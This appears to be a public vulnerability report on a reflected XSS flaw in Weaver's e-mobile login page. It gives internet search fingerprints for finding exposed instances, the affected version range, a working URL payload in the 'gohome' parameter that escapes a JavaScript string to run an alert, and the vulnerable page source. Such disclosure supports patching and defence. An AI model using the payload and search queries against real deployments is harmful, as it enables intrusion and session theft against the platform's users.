# The e-mobile mobile management platform of Weaver Network Technology Co., Ltd. has an XSS vulnerability.

## System fingerprint status The system fingerprint status is as follows:  
 
Over a hundred thousand users throughout the network use it throughout the network.
<img width="1920" height="913" alt="image" src="https://github.com/user-attachments/assets/2fd69da1-5873-4b33-84cc-4b2e556148e0" />
<img width="1920" height="938" alt="image" src="https://github.com/user-attachments/assets/acb5fdc1-f678-42e3-b5b5-34e50222fc1f" />

fofa：icon_hash="2062026853" && body="20250813"

quack：favicon: "f51746305f07a64eafa401adab364ad9" and body:"20250813"

## Vulnerability Analysis:

payload``?gohome="%3bwindow%5b%27al%27%2b%27ert%27%5d%281%29%3bvar%20test%3d"xss``

The XSS vulnerability can be triggered directly on the login page by appending a malicious payload to the URL.The exploitable versions range from 20240129 to the latest version 20250813, totaling 18 versions.

This website is the official version list from Weaver (Fanwei).https://emobile.weaver.com.cn/emp/download/log.html

The user can control the "gohome" parameter, and the input text is echoed on the front-end interface.And there is no filtering of quotation marks and semicolons.The user can close the preceding quotation marks and escape from the original JavaScript statement.

<img width="1521" height="725" alt="2025" src="https://github.com/user-attachments/assets/5ce4f623-0f84-4e9d-97de-cfbcc0c4fa0c" />
<img width="1535" height="772" alt="195405" src="https://github.com/user-attachments/assets/58bd4e40-b2dc-4e2d-98cc-0ca8df70972e" />
<img width="1920" height="904" alt="195651" src="https://github.com/user-attachments/assets/8e5b43a6-515e-4cdf-b8bd-d44b9c68ae21" />

```
<script>
    var serverTitle = ""
    if (serverTitle) {
        window.document.title = serverTitle
    }
    window.contextPath = "";
    window.apiPrifix = "/emp";
    window.staticcdnurl = "";
    window.version = "20250331";
    window.accessToken = "";


    var accesstoken = window.accessToken;
    if (accesstoken==null || accesstoken==''){
        accesstoken = localStorage.getItem("access_token");
    }
    var url = window.location.href;
    var urlbase = url.split("#")[0];
    var gohome="";
    console.info(url)
    console.info(gohome)
    if(gohome=="gohome" && ( url.endsWith("/#/") ||  url.endsWith("/#") || url.indexOf("#")==-1 || url.endsWith("#/login") )){
        window.location.replace(urlbase + "#/home");
    }
    if (url.indexOf("#") != -1 && url.indexOf("login") == -1 && (accesstoken==null || accesstoken=='')) {
        window.location.replace(urlbase);
        url = urlbase;
    }else{
        document.write("<div id=\"root\"></div>");
        var baseUserId = localStorage.getItem("baseUserId");
        if (baseUserId == -1 && url.indexOf("msgMonitor") == -1 &&  url.indexOf("#") != -1) {
            if(url.split("#").length>1 && url.split("#")[1].length>1){
                urlbase = urlbase + "#/clientset/msgMonitor";
                window.location.replace(urlbase);
                url = urlbase;
            }

        }

    }
</script>
```
